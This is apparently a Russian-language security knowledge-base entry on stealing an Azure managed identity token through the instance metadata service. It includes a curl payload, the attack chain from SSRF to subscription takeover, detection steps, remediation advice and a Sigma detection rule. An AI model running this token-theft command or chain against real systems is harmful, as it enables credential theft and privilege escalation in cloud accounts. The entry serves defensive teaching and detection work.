---
id: cloud-azure-imds-managed-identity
title: "Azure: managed identity через IMDS"
type: cloud
target: azure
category: cloud
difficulty: intermediate
bypass: none
tags: [azure, imds, managed-identity, ssrf]
tested_on: ["Azure VM IMDS 2018-02-01+"]
success_rate: 0.45
risk: high
cwe: "CWE-918"
lab: null
last_verified: "2026-10-23"
references:
  - "https://attack.mitre.org/tactics/TA0007/"
  - "https://hackingthe.cloud/"
graph:
  - target: "cloud"
    type: instance_of
  - target: "ssrf"
    type: related_to
  - target: "privilege-escalation"
    type: leads_to
---

# Azure: managed identity через IMDS

!!! warning "Этика"
    Только лаборатории `hackbook` или системы с письменным разрешением на тестирование.

## Payload
```
curl -H 'Metadata: true' 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/'
```

## Explanation

Azure IMDS требует заголовок `Metadata: true`. Ответ — токен доступа управляемого
удостоверения (managed identity) для указанного ресурса: `https://management.azure.com/`
(ARM API), `https://storage.azure.com/`, `https://vault.azure.net` (Key Vault),
Microsoft Graph. Получив токен ARM, атакующий перечисляет подписки, группы ресурсов,
ищет ключи хранения и секреты, назначает себе роли.
Популярная цепочка: SSRF в веб-приложении на App Service -> IMDS -> токен ->
ARM -> доступ ко всей подписке.

## Detection

1. Внутри ВМ/App Service: запрос к `169.254.169.254/metadata/identity/...`.
2. Проверьте, какие managed identity назначены и какие роли у них
   (`az role assignment list --assignee <principalId>`).
3. Аудит: Azure Activity/Sign-in logs — неожиданные вызовы ARM с identity ВМ.
4. Сканирование конфигурации: Microsoft Defender for Cloud, `ROADtools`, `MicroBurst`.

## Remediation

- Managed identity с минимальными ролями (не Contributor/Owner на подписку).
- Ограничить исходящие соединения приложения (NSG + egress): блокировать 169.254.169.254
  там, где метаданные не нужны.
- Валидация URL в приложении, запрет редиректов.
- Key Vault с access policy, а не «все роли».
- Мониторинг IMDS-запросов и токенов, выдаваемых нестандартным ресурсам.
- Приватные эндпоинты и private link для хранилищ.

## Detection rules

```yaml
title: Azure IMDS — запрос токена managed identity изнутри ВМ
id: f6a7b8c9-0014-4f6a-8b9c-000000000014
status: experimental
description: >-
  GET к 169.254.169.254/metadata/identity/oauth2/token с заголовком
  Metadata:true — выдача OAuth-токена управляемого удостоверения. Через SSRF
  в App Service это полный захват прав identity.
references:
  - https://attack.mitre.org/techniques/T1552/005/
  - https://learn.microsoft.com/en-us/azure/active-directory/managed-identities-azure-resources/how-to-use-vm-token
logsource:
  category: firewall
  definition: 'egress-лог прокси/файрвола App Service/VM'
detection:
  selection:
    dst_ip: 169.254.169.254
    uri|contains: 'metadata/identity/oauth2/token'
  condition: selection
fields:
  - src_ip
  - dst_ip
  - uri
falsepositives:
  - штатные SDK Azure берут токены identity регулярно — алертуйте на источники,
    которым identity не положена (публичные веб-приложения после SSRF), и на
    resource= не из вашего списка
level: high
tags:
  - attack.credential_access
  - attack.t1552.005
  - cwe.918
```
